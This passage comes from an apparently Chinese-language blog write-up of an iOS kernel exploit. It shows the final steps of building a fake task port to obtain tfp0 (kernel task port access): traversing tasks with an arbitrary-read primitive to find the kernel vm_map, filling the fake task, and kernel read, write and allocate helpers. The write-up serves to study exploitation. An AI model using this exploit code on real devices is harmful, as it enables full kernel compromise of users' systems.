&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset_p_pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset_p_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以得出结论：获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_addr_ptr&lt;/code&gt;与宏&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kr32()&lt;/code&gt;里设置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_addr_ptr&lt;/code&gt;的值等价于设置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;task-&amp;gt;bsd_info&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addr - offset_p_pid&lt;/code&gt;，当调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pid_for_task()&lt;/code&gt;去获取PID时，就能实现任意读，在此基础上，宏&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k64()&lt;/code&gt;实现了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;字节读取效果&lt;/p&gt;

&lt;p&gt;这个内核任意读原语实现的很漂亮！&lt;/p&gt;

&lt;p&gt;利用这个任意读原语来实现PID的遍历，先判断本Task的PID是否为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;，如果不是就获取前一个Task，如果获取到PID为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;，就获取VM_MAP&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;kr64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self_port_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[!] READING VIA FAKE PORT WORKED? 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_vm_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bsd_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kr64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_BSD_INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bsd_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kr32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bsd_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_PROC_PID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kr64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_VM_MAP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kernel_vm_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kr64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_PREV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[i] kernel_vm_map: 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_vm_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;把获取到的VM_MAP填充到我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;，一个东拼西凑的TFP0就拿到手了&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ref_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;active&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_vm_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_ITK_SELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SMAP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;初始化一个全局&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tfpzero&lt;/code&gt;变量&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tfpzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init_kernel_memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tfp0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tfpzero&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tfp0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;init_kernel_memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;our_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;申请&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;字节内存，写&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4141414141414141&lt;/code&gt;，再读出来，能成功说明这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tfpzero&lt;/code&gt;是能用的&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] allocated: 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;wk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4141414141414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;readb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] read back: 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;readb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里要补充一点：这里申请的都是内核的空间，内核空间范围如下&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define VM_MIN_KERNEL_ADDRESS	((vm_address_t) 0xffffffe000000000ULL)
#define VM_MAX_KERNEL_ADDRESS	((vm_address_t) 0xfffffff3ffffffffULL)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这几个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k*()&lt;/code&gt;函数是基于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tfpzero&lt;/code&gt;实现的函数&lt;/p&gt;

&lt;p&gt;内存申请函数：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kalloc()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_vm_allocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tfpzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VM_FLAGS_ANYWHERE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;读函数：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rk32()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rk64()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rk32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
